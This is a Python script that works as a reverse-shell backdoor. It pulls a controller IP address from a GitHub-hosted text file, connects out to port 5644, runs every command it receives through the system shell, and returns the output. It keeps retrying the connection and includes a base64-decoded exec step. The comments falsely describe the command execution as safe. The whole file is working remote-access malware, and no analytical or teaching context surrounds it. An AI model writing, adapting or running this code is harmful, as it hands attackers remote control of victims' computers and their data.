import socket as s
import subprocess as sp
import time as t
import base64 as b64
import requests

def get_ip():
    url = "https://raw.githubusercontent.com/MR10A/API-hjbejvbhfNuhjhuhuh/main/ip.txt"
    try:
        response = requests.get(url)
        response.raise_for_status()  # Raise an exception for HTTP errors
        ip = response.text.splitlines()[0]
        return ip
    except requests.RequestException as e:
        print(f"Error fetching IP address: {e}")
        return None

def execute_command(command):
    """Safely execute the given command and return the output."""
    try:
        result = sp.getoutput(command)
        return result
    except Exception as e:
        return f'Error: {str(e)}'

def x(sck):
    sck.send(b'Connected\n')
    while True:
        try:
            cmd = sck.recv(1024).decode()
            if not cmd or cmd.lower() == 'exit':
                break
            # Execute command and send output
            out = execute_command(cmd)
            sck.send(out.encode())
        except Exception as e:
            sck.send(f'Error: {str(e)}\n'.encode())
    sck.close()

def y():
    ip = get_ip()
    if not ip:
        print("Failed to get IP address, terminating.")
        return

    port = 5644
    while True:
        try:
            sck = s.socket(s.AF_INET, s.SOCK_STREAM)
            sck.connect((ip, port))
            x(sck)
        except s.error as e:
            print(f"Socket error: {e}")
            t.sleep(10)
        except Exception as e:
            print(f"Unexpected error: {e}")
            break
        finally:
            sck.close()

def obfuscated_function():
    """Execute base64 encoded command, if safe to do so."""
    encoded_command = 'aW1wb3J0IHNvY2tldCBhcyBzOw=='  # This should be reviewed
    try:
        decoded_command = b64.b64decode(encoded_command).decode('utf-8')
        exec(decoded_command)
    except Exception as e:
        print(f"Error executing obfuscated command: {e}")

if __name__ == "__main__":
    obfuscated_function()  # Execute base64 decoded command
    y()
